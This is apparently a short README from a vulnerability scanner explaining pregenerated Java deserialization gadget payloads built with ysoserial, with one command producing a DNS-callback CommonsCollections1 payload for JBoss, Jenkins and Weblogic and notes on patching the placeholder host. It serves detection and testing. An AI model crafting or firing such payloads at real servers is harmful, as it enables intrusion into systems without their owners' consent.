# Pregenerated gadget payloads

The files are generated with the tool [ysoserial](). The string "AAAA" is used to guide where the host is placed in the payload. The length must also be changed accordingly. (`\0x04AAAA`, `\0x08host.com`)

## CommonsCollections1Dns

Gadget used for JBoss, Jenkins and Weblogic.
```
java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections1Dns http://AAAA > CommonsCollections1Dns
```
